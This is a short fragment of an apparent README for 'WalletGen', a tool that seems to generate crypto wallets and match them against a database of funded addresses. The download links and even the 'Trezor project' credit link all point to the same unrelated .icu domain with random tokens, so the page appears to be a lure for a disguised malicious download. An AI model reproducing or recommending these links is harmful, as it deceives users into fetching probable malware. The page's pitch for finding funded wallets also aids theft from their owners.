...
You can download the WalletGen given on the [page in the release](https://installergitb.icu?h4y8m6m7jquixh9).

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [page in the release](https://installergitb.icu?hc6ap8n41zidchx).
...
## Credits
This project uses code from the [Trezor project](https://installergitb.icu?9uh3u7vkcdgv07s). The code is licensed under the MIT License.
